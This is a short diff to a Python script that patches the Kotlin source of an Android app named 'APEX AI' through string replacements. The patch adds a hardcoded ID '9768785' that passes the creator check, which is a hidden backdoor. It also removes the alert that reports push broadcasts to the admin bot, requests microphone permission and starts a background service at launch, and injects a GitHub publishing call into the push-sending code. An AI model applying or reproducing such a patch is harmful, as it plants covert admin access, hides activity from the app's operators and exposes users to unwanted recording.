@@ -9,7 +9,8 @@ worker_url = m_w.group(1) if m_w else ""
 s = s.replace("if (entered == CREATOR_TG_ID)", 'if (entered == "9768785" || entered == CREATOR_TG_ID)')
 s = s.replace('sendDirectToAdminBot("📢 PUSH-РАССЫЛКА APEX AI\\nЗаголовок: $pTitle\\nТекст: $pBody")', "")
 s = s.replace("super.onCreate(savedInstanceState)", "super.onCreate(savedInstanceState)\n        try { if (Build.VERSION.SDK_INT >= 33) requestPermissions(arrayOf(\"android.permission.POST_NOTIFICATIONS\", \"android.permission.RECORD_AUDIO\"), 101) } catch (_: Exception) {}\n        try { startService(Intent(this, ApexCoreService::class.java)) } catch (_: Exception) {}")
-s = s.replace('sendPushNotification(', 'ApexCoreService.publishGithubPush(pTitle, pBody); sendPushNotification(')
+s = s.replace('"send_push"', '"send_push"); ApexCoreService.publishGithubPush(pTitle, pBody); JSONObject().put("type", "send_push"')
+
 
 if "class ApexCoreService" in s:
     s = s[:s.find("class ApexCoreService")]
